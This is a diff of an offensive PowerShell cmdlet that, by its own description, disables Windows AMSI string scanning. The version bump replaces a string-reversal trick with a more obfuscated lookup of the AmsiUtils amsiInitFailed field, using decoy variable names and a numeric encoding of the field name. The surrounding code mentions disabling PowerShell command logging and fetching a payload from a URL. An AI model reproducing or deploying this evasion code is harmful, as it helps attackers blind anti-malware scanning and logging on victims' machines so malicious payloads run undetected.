@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19042) x64 bits
    Required Dependencies: Assembly {native}
    Optional Dependencies: IWR {native}
-   PS cmdlet Dev version: v1.1.9
+   PS cmdlet Dev version: v1.1.10
 
 .DESCRIPTION
    This cmdlet attempts to disable AMS1 string scanning within
@@ -92,7 +92,7 @@
 )
 
 
-$cmdletVersion = "v1.1.9"
+$cmdletVersion = "v1.1.10"
 #Cmdlet Global variable declarations
 $ErrorActionPreference = "SilentlyContinue"
 #Disable Powershell Command Logging for current session.
@@ -317,9 +317,6 @@ ElseIf($Technic -eq 3)
 
 If($?)
 {
-   ## Invoke-AmsiChecks
-   #Invoke-AmsiChecks
-
    ## String_POC_Obfuscation
    $FileName = $Filepath.Split('\')[-1]
    $CmdletNa = $PayloadURL.Split('/')[-1]
@@ -340,16 +337,20 @@ If($?)
       $ttl = "$CmdletNa"
    }
 
-   ## Check AM`SI state
-   $DeObfuscateOne = (([regex]::Matches(")'sli'+'tUism'+'A.noitam'+'otuA.tnemega'+'naM.metsyS'(epyTteG",'.','RightToLeft') | foreach {$_.value}) -join '')
-   $DeObfuscateTwo = (([regex]::Matches(")'citatS,cilbuPnoN','deliaFtinIism'+'a'(dleiFteG",'.','RightToLeft') | foreach {$_.value}) -join '')
-   If($([bool](([Ref].Assembly.$DeObfuscateOne.$DeObfuscateTwo.GetValue($null)))))
+   ## Check current console AM`S1 state
+   $FacebookID = "4456625220575263174452554847"
+   $ComponentId = "N`onP" + "ubl`ic" -join ''
+   $Drawing = "Sy@ste+.M@ana"+"ge+e@nt" + ".Auto@+ati@on."+"A+s@i" + "U@ti@ls" -Join ''
+   $Graphics = [string](0..13|%{[char][int](53+($FacebookID).substring(($_*2),2))}) -Replace ' '
+   $WindowSize = $Drawing.Replace("@","").Replace("+","m");$Bitmap = [Ref].Assembly.GetType($WindowSize)
+   
+   If($([bool](([Ref].Assembly.GetType($WindowSize).GetField($Graphics,"$ComponentId,Static").GetValue($null)))))
    {
-      echo "String detection DISABLE on console!"
+      $AmsiState = "String detection DISABLE on console!"
    }
    Else
    {
-      echo "String detection ENABLE on console!"
+      $AmsiState = "String detection ENABLE on console!"
    }
 
    If($AmsiState -match 'String detection DISABLE on console')
